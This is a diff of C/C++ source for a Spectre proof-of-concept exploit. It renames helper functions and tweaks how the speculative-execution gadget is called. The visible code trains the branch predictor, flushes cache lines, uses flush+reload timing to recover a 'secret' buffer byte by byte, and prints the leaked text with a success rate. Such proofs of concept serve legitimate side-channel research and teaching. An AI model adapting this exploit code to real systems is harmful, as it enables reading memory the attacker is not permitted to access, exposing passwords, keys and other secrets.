@@ -25,7 +25,7 @@ void side_channel_check()
 {
     for (size_t i = FROM; i <= TO; i++)
     {
-        if (ASMUtils::flush_reload((char *)mem_side_channel + 2048 * i))
+        if (asm_utils::flush_reload((char *)mem_side_channel + 2048 * i))
         {
             hist[i]++;
         }
@@ -44,7 +44,7 @@ bool is_prime(int a)
 
 // #define LOOP
 // #define PRIME
-void init_attack_setting()
+void init()
 {
 #ifdef LOOP
     for (int i = 0; i < TRAINING_LOOPS; i++)
@@ -96,20 +96,21 @@ void attack(size_t target)
     int i, j;
     for (size_t i = 0; i < 256; i++)
     {
-        ASMUtils::flush(&mem_side_channel[i * 2048]);
+        asm_utils::flush(&mem_side_channel[i * 2048]);
     }
     for (i = TRAINING_LOOPS - 1; i >= 0; i--)
     {
         train_idx = i % arr_size;
-        ASMUtils::flush(&arr_size);
-        ASMUtils::mfence();
+        asm_utils::flush(&arr_size);
+        asm_utils::mfence();
 
         // training branch predict
         for (j = TRAINING_LOOPS - 1; j >= 0; j--)
         {
             idx = IS_ATTACK[j] * target + (!IS_ATTACK[j]) * train_idx;
+            spectre(idx);
             // printf("idx %ld\n", idx);
-            uint8_t result = spectre(idx);
+            // uint8_t result = spectre(idx);
             // printf("result: %c\n", result);
         }
 
@@ -121,7 +122,7 @@ void attack(size_t target)
     }
 }
 
-size_t show_side_channel()
+size_t get_side_channel_info()
 {
     printf("  ");
     for (size_t i = FROM; i <= TO; i++)
@@ -161,13 +162,13 @@ size_t run(size_t locate)
     {
         attack(locate);
     }
-    size_t result = show_side_channel();
+    size_t result = get_side_channel_info();
     return result;
 }
 
 int main(int argc, char **argv)
 {
-    init_attack_setting();
+    init();
 
     size_t target_base = (size_t)(&secret) - (size_t)(&arr);
 
@@ -191,7 +192,7 @@ int main(int argc, char **argv)
     }
     for (size_t i = 0; i < len - 1; i++)
     {
-        printf("%c", leak[i]);
+        printf("%c", (char)leak[i]);
     }
     printf(", success rate: %.3lf%%\n", (double)success / (len - 1) * 100);
     return 0;
